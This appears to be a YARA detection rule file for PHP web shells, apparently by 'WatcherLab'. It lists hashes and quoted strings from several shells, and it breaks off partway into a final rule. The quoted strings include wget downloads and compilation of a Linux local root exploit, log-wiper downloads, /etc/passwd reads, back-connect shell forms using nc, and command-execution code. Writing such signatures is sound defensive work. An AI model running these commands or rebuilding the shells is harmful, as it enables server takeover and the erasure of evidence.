rule _01e9565cecc4e989123f9620c1d09c09_27_9_44b8eca32932e4e42f0d59dfe67014b2bba88292_88
{
   meta:
      description = "php17 - from files 01e9565cecc4e989123f9620c1d09c09.php, 27.9.php, 44b8eca32932e4e42f0d59dfe67014b2bba88292.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9711738fbc89cd6b37366690193dfdd6402af920106426ff9d33aae65eaba5c8"
      hash2 = "dd984fae70333dc6899b7e226362573ddef2d1185a4349e832a86c9f90ee2b3f"
      hash3 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
   strings:
      $x1 = "<OPTION VALUE=\"wget http://www.synsta.templatez.org/1.txt\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit (Part 1)" fullword ascii
      $x2 = "<OPTION VALUE=\"wget http://www.synsta.templatez.org/1.txt\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit" fullword ascii
      $x3 = "<OPTION VALUE=\"mv 1.txt exploit.c\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit (Part 2)" fullword ascii
      $x4 = "<OPTION VALUE=\"gcc exploit.c -o exploit\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit (Part 3)" fullword ascii
      $x5 = "<form action=\"<?php echo $surl; ?>\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_act\" " ascii
      $x6 = "<OPTION VALUE=\"wget http://packetstormsecurity.org/UNIX/penetration/log-wipers/logcleaner-0.3.c\">Wipelogs (Part 1)(Zap3)" fullword ascii
      $x7 = "<OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/vanish.c\">Wipelogs (Part 1)(Vanish)" fullword ascii
      $x8 = "<OPTION VALUE=\"which wget curl w3m lynx\">Check For Downloaders (WGET, et cetera)" fullword ascii
      $x9 = "<OPTION VALUE=\"./exploit\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit (Part 4)" fullword ascii
      $x10 = "<OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/vanish.c\">Wipelogs (Part " fullword ascii
      $s11 = "echo(\"<b>Bind Shell Backdoor:</b></br></br><form name=form method=POST>" fullword ascii
      $s12 = "<OPTION VALUE=\"wget http://packetstormsecurity.org/UNIX/penetration/log-wipers/logcleaner-0.3.c\">Wipelogs (P" fullword ascii
      $s13 = "<OPTION VALUE=\"cat /var/cpanel/accounting.log\">Get cpanel logs" fullword ascii
      $s14 = "<OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c <?php passthru('pwd'); ?>\">Tar your current directory. (Only works if the dir" fullword ascii
      $s15 = "File: <input type=\"text\" name=\"file\"> <input type=\"submit\" value=\"Read File\"><br><br> eg: /etc/passwd<br>" fullword ascii
      $s16 = "<OPTION VALUE=\"gcc logcleaner-0.3.c -o logcleaner-0.3\">Wipelogs (Part 2)(Zap3)" fullword ascii
      $s17 = "<tr><td width=\"100%\" height=\"1\" valign=\"top\"><center><form action=\"<?php echo $surl; ?>\"><input type=hidden name=act val" ascii
      $s18 = "<OPTION VALUE=\"find . -type f -name config.inc.php\">Find config.inc.php files in current directory" fullword ascii
      $s19 = "<OPTION VALUE=\"find . -type f -name \"config*\">Find config* files in current directory" fullword ascii
      $s20 = "echo \"dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\"; ?>\">&nbsp;<input type=\"submit\" nam" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _15febc7c452fb361fc5eca8e67711a86a9ee0b9e_36c1b4eaebafcab661febec9cbce65e6c4e063d4_acid_acidshell_89
{
   meta:
      description = "php17 - from files 15febc7c452fb361fc5eca8e67711a86a9ee0b9e.php, 36c1b4eaebafcab661febec9cbce65e6c4e063d4.php, acid.php, acidshell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
      hash2 = "dad311ac627ea5509814218f21e1f11d0f61632866aadaf5c3a43629f5801c1b"
      hash3 = "a6580477b138c01f062a33f2f204f412d3ffcdfd44dd6bffe476aefefab1fca3"
      hash4 = "a455a962041f9ef980414ecb1695c263cea42c41731caf1f0c34293cc937b1ef"
   strings:
      $x1 = "function tpftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh) {" fullword ascii
      $x2 = "displaysecinfo(\"Kernel Version\",tpexec(\"sysctl -a | grep version\"));" fullword ascii
      $x3 = "elseif (is_callable('system') and !in_array('system',$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $resu" fullword ascii
      $x4 = "elseif (is_callable('passthru') and !in_array('passthru',$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd);" fullword ascii
      $x5 = "srv_info(\"ID\",($win) ? get_current_user().\" (uid=\".getmyuid().\" gid=\".getmygid().\")\" : tpexec(\"id\"));" fullword ascii
      $x6 = "if (!$fp) {return \"Local error: can't write update to \".__FILE__.\"! You may download tpshell.php manually <a href=\\\"\"." fullword ascii
      $s7 = "$logfile = $tmpdir_logs.\"tpsh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $s8 = "<center><img src=\"http://i53.tinypic.com/qss19g.png\" alt=\"ShellBanner\"></center>" fullword ascii
      $s9 = "echo('<center><b>Back-Connection:</b></br></br><form name=form method=POST>Host:<input type=text name=backconnectip size=15 val" fullword ascii
      $s10 = "src =\"http://www.yougetsignal.com/tools/web-sites-on-web-server//\"" fullword ascii
      $s11 = "ter using \\'<b>nc -l -n -v -p '.$bc_port.'</b>\\'.  Then, click \"Connect\" once the port is listening.</center>');" fullword ascii
      $s12 = "if (is_callable('exec') and !in_array('exec',$disablefunc)) {exec($cmd,$result); $result = join(\"\\n\",$result);}" fullword ascii
      $s13 = "echo('<center><b>Back-Connection:</b></br></br><form name=form method=POST>Host:<input type=text name=backconnectip size=15 valu" ascii
      $s14 = "ight[\".$k.\"][0] - unknown command.\"; tpshexit();}" fullword ascii
      $s15 = "if (tpexec2($cmd[1])) { $statinfo[] = showstat($cmd[0],\"on\"); }" fullword ascii
      $s16 = "array(\"Find tpshell in current dir\", \"find /c \\\"tp\\\" *\")," fullword ascii
      $s17 = "if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo \"Warning! Configuration error in \\$regxp_highlight[\".$k" ascii
      $s18 = "return \"http://packetstormsecurity.org/search/?q=Linux Kernel \".$Lversion;" fullword ascii
      $s19 = "array(\"[ Processes ]\",$surl.\"act=processes&d=%d\")," fullword ascii
      $s20 = "echo \"<table border=0><tr><td><form name=\\\"tpsh_sqlquery\\\" method=POST><b>\"; if (($sql_query) and (!$submit)) {echo \"Do " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _01f78be6f7cad02658508fe4616098a9_0353ab4cbed5beae847a7ff6e220b5cf_05311655a15b75fab86956663e1819cd_0771fc6f0f4b1d7d1bb73bbb_90
{
   meta:
      description = "php17 - from files 01f78be6f7cad02658508fe4616098a9.php, 0353ab4cbed5beae847a7ff6e220b5cf.php, 05311655a15b75fab86956663e1819cd.php, 0771fc6f0f4b1d7d1bb73bbbe14e0e31.php, 0ad17701cf5e5a59aa57f35aa240d9e40d28ba50.php, 0b544ac96e173af11ffee87dee8aad446339801e.php, 15febc7c452fb361fc5eca8e67711a86a9ee0b9e.php, 1898eebe767f4dda4709621164eeef8377c43bb3.php, 32e36b9cd77416c8e4d5d7284d54683e75abfed6.php, 36c1b4eaebafcab661febec9cbce65e6c4e063d4.php, 398fcc4176cbdefb9271ad67decbab5c08312bf2.php, 502adcbc50636b667202497c1f398a36413e3284.php, 626c5c9305cee457e10b85c81af262c5bc437255.php, 63187568f13bf233f781f008c528b0e160650211.php, 6612561e19ec45c494d5154c3b502a2e72817735.php, 67782cfe732cea7fbc4c91e9133b005ad9401377.php, 6a6f0260611dcd60d502d308f74ff3c1ad590cfe.php, 6f53dce817b117198fc0950d87e362fdcf7852e2.php, 8cb6a80a86bf37cd3977cab94909c299ec22a092.php, 9f18fc1e8b779eec4d289eea454f05549d387a51.php, acid.php, acidshell.php, AntiSecShell.v0.5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ae6e0b74f1a1697985e45ec9fbd291fbc9ace52680fc2fd14726abf66859138a"
      hash2 = "b6f96297c1c905e32413c6deb7e794cb8a1af37b9295e5cff257a6ff063ccbd4"
      hash3 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      hash4 = "faeff8e37876023a6f84c94e090b22c9b3eea333ed96d2688c45d8900f7cfdbc"
      hash5 = "59f77ca5eb2380fcee10e7282bdcbb628a075bd83ff3dfabd2b8851cc80a466b"
      hash6 = "12e93dd17c20d1aef103ccc66e1b7d5b3849b81a0ab88e8c03777a7a88fbebf0"
      hash7 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
      hash8 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
      hash9 = "5ac936e86e90cda1df398a4f3044c9d6d1707bc6ddf5d1bbdfc9e03553ff907b"
      hash10 = "dad311ac627ea5509814218f21e1f11d0f61632866aadaf5c3a43629f5801c1b"
      hash11 = "2884d456f6a33415db1ce6c8ef4a9a6ed860b3f76482c8460d27bd83120858ab"
      hash12 = "80fa31cc87c2618a5ea267baed3707f78b4b7d4a20cc8a91b231d5ce1d1a42e8"
      hash13 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
      hash14 = "2a5f0fc4984d08fa9e8c3c5ccda1b09438d6bd04a7f962844088a6c45e248d71"
      hash15 = "bf83456b0b6f02b4bc25f1848c7f825cd7505f2c740f01c1a254df33bfebfa06"
      hash16 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
      hash17 = "178ec234348b08e4da3d0d26f0e0db9637184e9fb4aec6b7345a5521c54456ac"
      hash18 = "1dc571ae9a2775e50505fa455a9d32b6953bc00e16afbe7fc225e8993b2e6c7a"
      hash19 = "f5e8951fddabbfebee6f93380486d027fd88f05623f3856dcf81ae05e78d9da6"
      hash20 = "d43cdb0daf132269b0a706a1a1b4970450fbaba34492e056305cab320f8c4ba5"
      hash21 = "a6580477b138c01f062a33f2f204f412d3ffcdfd44dd6bffe476aefefab1fca3"
      hash22 = "a455a962041f9ef980414ecb1695c263cea42c41731caf1f0c34293cc937b1ef"
      hash23 = "da5ea23323881addae2ecd9a44947f05d5dbc216ac24cdf9361b14f18ea8e31c"
   strings:
      $s1 = "\"krqAsLfJ7YQBl4tiRCYFSpPMdRRCoQOiL4i8CgZgk09WfWLBYZHB6UWjCequwEDHuOEVK3QtgN/j\"." fullword ascii
      $s2 = "\"AkUnGTkRNwMS34MBJBgdRkJLCD7qggEPKxsJKiYTBweJkjhQkk7AhxQ9FqgLMGBGkG8KFCg8JKAi\"." fullword ascii
      $s3 = "\"pVxqhlxqiExkimKBtMPL2Ftvj2OV6aOuwpqlulyN3cnO1wAAXQAAZSM8jE5XjgAAbwAAeURBYgAA\"." fullword ascii
      $s4 = "\"wSiUtmYkkrgwOAeA5zrqaLldBiNMIJeD266XYTgQDm5Rx8mdG+oAbSYdaH4Ga3c8JBMJaXQGBQgA\"." fullword ascii
      $s5 = "\"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm\"." fullword ascii
      $s6 = "\"AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA\"." fullword ascii
      $s7 = "\"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP8AAP8A/wAAgIAAgP//AAAAAAAAAAM6\"." fullword ascii
      $s8 = "\"MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm\"." fullword ascii
      $s9 = "\"Xv/9qfbptP/uZ93GiNq6XWpRJ//iQv7wsquEQv/jRAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"." fullword ascii
      $s10 = "\"/3eHt6q88eHu/ZkfH3yVyIuQt+72/kOm99fo/P8AZm57rkGS4Hez6pil9oep3GZmZv///yH5BAEA\"." fullword ascii
      $s11 = "\"ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A\"." fullword ascii
      $s12 = "\"Ev/hP+7OOP/WHv/wbHNfP4VzV7uPFv/pV//rXf/ycf/zdv/0eUNJWENKWsykIk9RWMytP//4iEpQ\"." fullword ascii
      $s13 = "\"QhwcHP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA\"." fullword ascii
      $s14 = "\"ZeAPNudAX9sKMPv7+15QU5ubm39/f8e5u4xiatra2ubKz8PDw+pfee9/lMK0t81rfd8AKf///wAA\"." fullword ascii
      $s15 = "\"AAgzAFEIHEiwoMGDCBH6W0gtoUB//1BENOiP2sKECzNeNIiqY0d/FBf+y0jR48eQGUc6JBgQADs=\"," fullword ascii
      $s16 = "\"mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z\"." fullword ascii
      $s17 = "\"R0lGODlhFAAUAKIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8\"." fullword ascii
      $s18 = "\"R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzLKysoaGhmZmZgQEBP///wAAAAAAAAAAAAAAAAAA\"." fullword ascii
      $s19 = "\"R0lGODlhFAAUAPIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8\"." fullword ascii
      $s20 = "\"R0lGODlhFAAUALMAAAAAAP////j4+OPj493d3czMzLKysoaGhk1NTf///wAAAAAAAAAAAAAAAAAA\"." fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x733c or uint16(0) == 0xbbef ) and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _12ce6c7167b33cc4e8bdec29fb1cfc44ac9487d1_6be2f32f7bd00e6aba1dae118f0975eb821b8b6c_91
{
   meta:
      description = "php17 - from files 12ce6c7167b33cc4e8bdec29fb1cfc44ac9487d1.php, 6be2f32f7bd00e6aba1dae118f0975eb821b8b6c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d4d1c80f4ca8242750ecfcb12694d5d32376167eaa28734ff2cd393e27fd8120"
      hash2 = "bd1d52289203866645e556e2766a21d2275877fbafa056a76fe0cf884b7f8819"
   strings:
      $s1 = "x5c^>Ew:Qb:Qc:W~f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-K)e24-" fullword ascii
      $s2 = "x24)%zW%hj!<*#cd2bge56+99386c6f+9f5d816:5f9#-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboepn)%epnbss-%88:}334}472" fullword ascii
      $s3 = "x27idtutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j]y6g]257]y86]267]y74]275]y7:]b%!|!*)323zbek!~!<b%" fullword ascii
      $s4 = "x27!hmg%!)!gj!<2,*j%!-#1]#-!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K4]6]234]342]58]24]31#-%tdz*Wsfuvso!%bss" fullword ascii
      $s5 = "x27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;ut_map(\"oaxjhon\",str_split(\"%tjw!>!#]y84]275]y83]248]y83]256]y81]265]ycx = \"" fullword ascii
      $s6 = "x27;!>>>!}_;gvc%}&;ft7e:56-xr.985:52985-t.98]K4]65]D8]gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsd268]y7f#<!%tww!>!" fullword ascii
      $s7 = "164\") && (!isset($:h%:<#64y]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47pmdXA6|7**197-2qj%7-K)udfoopdXA" fullword ascii
      $s8 = "x22!ftmbg)!gj<*#k#)usb;`ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%x5c2b%!>!2p%!*3>?*2bx31\")) or (strstr($uas,\"" fullword ascii
      $s9 = "16)-1);} @error_reporting(0);)uqpuft`msvd},;uqpuft`msvd}+;!>!}" fullword ascii
      $s10 = "8y]#/r%/h%)n%-#+I#)53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C" fullword ascii
      $s11 = "ps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:" fullword ascii
      $s12 = "x272qj%6<^#zsfvr#00~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<*o#>b%!**X)ufttj" fullword ascii
      $s13 = "x27jsv%6<C>^#]445]212]445]43]321]464]284]366<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR" fullword ascii
      $s14 = "x27;%!q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#fopoV;hojepd%!-uyfu%)3of)fepdof`57ftbc" fullword ascii
      $s15 = "x7IjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:649#-!#:618dW%eN+#Qi" fullword ascii
      $s16 = "x27tfs%6<*17-SFEBFI,0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)32>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr" fullword ascii
      $s17 = "x27{ft2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+yfeobzo:>:iuhofm%:-5ppde:4:|:**#ppde#)tutjyf`4" fullword ascii
      $s18 = "x61\"]=1; $uas=strtolower($_SERVE:56985:6197g:74985-rr.93e:5597f-s.973:8297f:529qjA)qj3hopmA" fullword ascii
      $s19 = "x27!hmg%)!gj!|!*8]322]3]364]6]283]427]36]373P6]36]73]83]238M7]381%)gpf{jt)!gj!<*2bd%-#1G%6<" fullword ascii
      $s20 = "x24*<!ubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#bq}k;opjudovg}x;0]=])0#)U!" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 30KB and ( 8 of them )
      ) or ( all of them )
}

rule _04025959b191f8f9de3f924f0940515f_3f94ac8bf2a341a7a409e641fd53b149be077bb8_8624a02263f24c08ab7775f5c2ebacdf48be3abd_92
{
   meta:
      description = "php17 - from files 04025959b191f8f9de3f924f0940515f.php, 3f94ac8bf2a341a7a409e641fd53b149be077bb8.php, 8624a02263f24c08ab7775f5c2ebacdf48be3abd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5916525af28ec268daed30e0bb38e97d3509f54a015be7f240ba5b0a3bb08267"
      hash2 = "aeadda27d91c0c57d56c65135295036c0edb31e76df2c4eb1ebf50b5913b570c"
      hash3 = "66d71af2923d108af2757dfad504202a021eab95ea6b2d7f9bab95e977b3be49"
   strings:
      $x1 = "print $st.$c1.\"<div><b><center>Execute useful commands</div>\";" fullword ascii
      $s2 = "print \" - <a target='_blank' href=\".inclink('dlink', 'phpinfo').\">phpinfo</a>\";" fullword ascii
      $s3 = "print \"<center><div><b>Enter the command to execute\";print $ec;" fullword ascii
      $s4 = "$owhich){if(function_exists(exec)){$nval=exec($ocmd);}elseif(!function_exists(exec)){$nval=shell_exec($ocmd);}" fullword ascii
      $s5 = "input(\"submit\",\"\",\"Execute\",\"\");print \"</center>\".$ef.$ec.$et.\"</div></td>\";" fullword ascii
      $s6 = "print \" - <a href=\".inclink('dlink', 'cmdhlp').\"&scdir=$nscdir>Cmd help</a>\";" fullword ascii
      $s7 = "print $st.$c1.\"<div><b><center>Execute php code with eval()</div>\";" fullword ascii
      $s8 = "print \"<p><b>: Insert the command below to get help or to know more about it's uses :\";print \"<form method=get>\";" fullword ascii
      $s9 = "input('submit','evsub','Execute');print \" \";" fullword ascii
      $s10 = "print \" - <a href=\".inclink('dlink', 'basepw').\">Base64 decode</a>\";" fullword ascii
      $s11 = "print\"<font color=red><b>Acik ( Guvenli )</b></font>\";}}function inifunc($inif){$chkin=ini_get($inif);" fullword ascii
      $s12 = "print \" - <a href=\".inclink('dlink', 'showsrc').\"&scdir=$nscdir>File source</a>\";" fullword ascii
      $s13 = "print \" - <a href=\".inclink('dlink', 'qindx').\"&scdir=$nscdir>Quick index</a>\";" fullword ascii
      $s14 = "print \" - <a href=\".inclink('dlink', 'urld').\">Url decode</a>\"; " fullword ascii
      $s15 = "if ($dlink==\"basepw\"){ print \"<p><b>[ Base64 - Decoder ]</b>\"; " fullword ascii
      $s16 = "print \"</td></tr></table>\";delm(\": Safe mode bypass :\");" fullword ascii
      $s17 = "print '\\n[ Bk-Code shell by Black-Code :: connect back backdoor by Crash_over_ride ]';" fullword ascii
      $s18 = "print \" - <a href=\".inclink('dlink', 'zone').\"&scdir=$nscdir>Zone-h</a>\";" fullword ascii
      $s19 = "$hlp = escapeshellcmd($hlp);print \"<p><table width=100% height=30% bgcolor=#dadada border=2><tr><td>\";" fullword ascii
      $s20 = "print \" - <a href=\".inclink('dlink', 'urlen').\">Url encode</a>\"; " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _0070d23b06b1486a538c0eaa45dd167a_ac9d12b292485653860a0feee1e80728b62aa789_93
{
   meta:
      description = "php17 - from files 0070d23b06b1486a538c0eaa45dd167a.php, ac9d12b292485653860a0feee1e80728b62aa789.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3177334ae8eb2317c5e0775b05a002a43360a76dea4d068d35f9c271c1499408"
      hash2 = "3c7f22c9123e04109df7ec11a9a94cc1b552d0ab33f2b2e5e35deacf27841f2c"
   strings:
      $s1 = "<a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">Security Angel</a> " fullword ascii
      $s2 = "<a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">www.4ngel.net</a> " fullword ascii
      $s3 = "angel [<a href=\\\"http://www.bugkidz.org\\\" target=\\\"_blank\\\">BST</a>] " fullword ascii
      $s4 = "echo \"  <td style=\\\"padding-left: 5px;\\\"><a href=\\\"$filepath\\\" target=\\\"_blank\\\">$file</a></td>\\n\";" fullword ascii
      $s5 = "<option value=\"shell_exec\" <? if ($execfunc==\"shell_exec\") { echo \"selected\"; } ?>>shell_exec</option>" fullword ascii
      $s6 = "<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; } ?>>passthru</option>" fullword ascii
      $s7 = "$shellmode=(!get_cfg_var(\"safe_mode\")) ? \" | <a href=\\\"?action=shell\\\">WebShell</a>\" : \"\";" fullword ascii
      $s8 = "</a><?=$phpinfo?><?=$shellmode?> | <a href=\"?action=sql\">SQL Query</a> | <a href=\"http://www.4ngel.net\" target=\"_blank\" ti" ascii
      $s9 = "<option value=\"system\" <? if ($execfunc==\"system\") { echo \"selected\"; } ?>>system</option>" fullword ascii
      $s10 = "<option value=\"exec\" <? if ($execfunc==\"exec\") { echo \"selected\"; } ?>>exec</option>" fullword ascii
      $s11 = "<option value=\"popen\" <? if ($execfunc==\"popen\") { echo \"selected\"; } ?>>popen</option>" fullword ascii
      $s12 = "echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILES['uploadmyfile']['name'].\"\") ? \"" fullword ascii
      $s13 = "<form action=\"?action=shell&dir=<?=urlencode($dir)?>\" method=\"POST\">" fullword ascii
      $s14 = "<td align=\"center\"><textarea name=\"filecontent\" cols=\"100\" rows=\"20\"><?=$contents?></textarea></td>" fullword ascii
      $s15 = "<input type=\"submit\" name=\"login\" value=\"OK\">" fullword ascii
      $s16 = "<td width=\"375\" align=\"right\" nowrap><b><?=$_SERVER['HTTP_HOST']?></b></td>" fullword ascii
      $s17 = "echo $msg=@fwrite($fp,$_POST['filecontent']) ? \"" fullword ascii
      $s18 = "<form action=\"?dir=<?=urlencode($dir)?>\" method=\"POST\" enctype=\"multipart/form-data\">" fullword ascii
      $s19 = "<input name=\"dbpassword\" type=\"text\" class=\"INPUT\" size=\"15\" value=\"<?=$dbpassword?>\">" fullword ascii
      $s20 = "<input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['command']?>\" class=\"input\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 60KB and ( 8 of them )
      ) or ( all of them )
}

rule _043c3d7e489c69b48737cc0c92d0f3a2_0e634bcc16b562c9a8365ef42b37be8a0eabfd73_2011_2011__2__6e43c4411972b54c6780f45d8863e08470f_94
{
   meta:
      description = "php17 - from files 043c3d7e489c69b48737cc0c92d0f3a2.php, 0e634bcc16b562c9a8365ef42b37be8a0eabfd73.php, 2011.php, 2011__2_.php, 6e43c4411972b54c6780f45d8863e08470f6a814.php, aa8514a4fdeb999bcad59439fa0836b7178853a9.php, angel.php, angelbig.php, AngelShell_98c9a1a1ec03aa4c9f51292d4abe408ced4f7001.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8fd44823c19aafc02c2e1b4100b724e38d11d67ff21454995ceccaab08631371"
      hash2 = "c3f7e90a63448f7c30f4dd29dce054cd172b0be138896ee8317c72f5f2a48e40"
      hash3 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash4 = "c8bf9b5705932c5daf06806e32f65cc2c32e0f32949ff585882d80e94776a8ac"
      hash5 = "59302187103fbecff7be8b940f62a7d7e207cdbeed15624d4348dc9a5b021d07"
      hash6 = "23738a2cfdd29fa9dc4a1ff2d56de59ee03e76ff24ccac1462e29f1581d24c5e"
      hash7 = "80fe738fc052d94595dead391df3e26647e946120973521da619997ceec386bc"
      hash8 = "0fd97a214233256bdfd5129cf8ff2129e0bb5804339e371acad303d2238e4f03"
      hash9 = "070c6119a886d2083ce66a4edca35d80075a89268bc15f76cce50df2ec59c708"
   strings:
      $s1 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#f00;\">Close</span></li>');" fullword ascii
      $s2 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#080;\">Open</span></li>');" fullword ascii
      $s3 = "<title><?php echo $action.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
      $s4 = "<?php if (!IS_WIN) {?> | <a href=\"javascript:g('backconnect');\">Back Connect</a><?php }?>" fullword ascii
      $s5 = "<span style=\"float:right;\">PHP <?php echo PHP_VERSION;?> / Safe Mode:<?php echo getcfg('safe_mode');?></span>" fullword ascii
      $s6 = "p($comma.'<a href=\"javascript:godir(\\''.$drive->Path.'/\\');\">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');" fullword ascii
      $s7 = "secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));" fullword ascii
      $s8 = "$tabledump = 'INSERT INTO `'.$table.'` VALUES ('.implode(\", \", $row).');'.\"\\n\";" fullword ascii
      $s9 = "$tabledump = \"DROP TABLE IF EXISTS `$table`;\\n\";" fullword ascii
      $s10 = "secparam('Supported databases', implode(', ', $temp));" fullword ascii
      $s11 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
      $s12 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
      $s13 = "scookie('loginpass',encode_pass($password));" fullword ascii
      $s14 = "return round( $size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizename[$i];" fullword ascii
      $s15 = "if ($keyfied && strtolower(substr($query,0,13)) == 'select * from') {" fullword ascii
      $s16 = "p('<td nowrap><a href=\"javascript:rename(\\''.$dirdb['server_link'].'\\');\">Rename</a></td>');" fullword ascii
      $s17 = "makeinput(array('title'=>'Current folder/file (fullpath)','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));" fullword ascii
      $s18 = "secparam('cURL support', function_exists('curl_version')?'enabled':'no');" fullword ascii
      $s19 = "if ($action == 'login') {" fullword ascii
      $s20 = "m('Deleted folder/file have finished,choose '.count($dl).' success '.$succ.' fail '.$fail);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _01e9565cecc4e989123f9620c1d09c09_01f78be6f7cad02658508fe4616098a9_0353ab4cbed5beae847a7ff6e220b5cf_05311655a15b75fab8695666_95
{
   meta:
